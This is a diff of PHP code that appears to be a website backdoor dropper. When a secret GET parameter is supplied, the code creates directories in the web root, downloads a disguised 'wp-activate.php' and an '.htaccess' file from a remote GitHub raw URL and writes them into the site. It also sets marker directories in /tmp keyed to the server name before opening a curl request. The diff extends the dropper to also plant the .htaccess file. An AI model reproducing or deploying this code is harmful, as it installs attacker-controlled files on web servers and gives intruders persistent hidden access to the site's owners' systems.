@@ -4,14 +4,17 @@ if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){
 mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 
 $file = sexx('https://raw.githubusercontent.com/HecSec/New/main/wp-activate.php');
-
 $local=$_SERVER['DOCUMENT_ROOT']."/cgi-et/1index.php";
-if(file_put_contents($local, $file));  }
+if(file_put_contents($local, $file));  
+
+$filee = sexx('https://raw.githubusercontent.com/HecSec/New/main/.htaccess');
+$locall=$_SERVER['DOCUMENT_ROOT']."/cgi-et/.htaccess";
+if(file_put_contents($locall, $filee));  }
 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(file_exists('/tmp/dfgdfg'.$d.$random)) { } else {
-	mkdir('/tmp/dfgdfgdfgdf'.$d.$random);
+if(file_exists('/tmp/gggg4g4g4g'.$d.$random)) { } else {
+	mkdir('/tmp/gggg4g4g4g'.$d.$random);
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
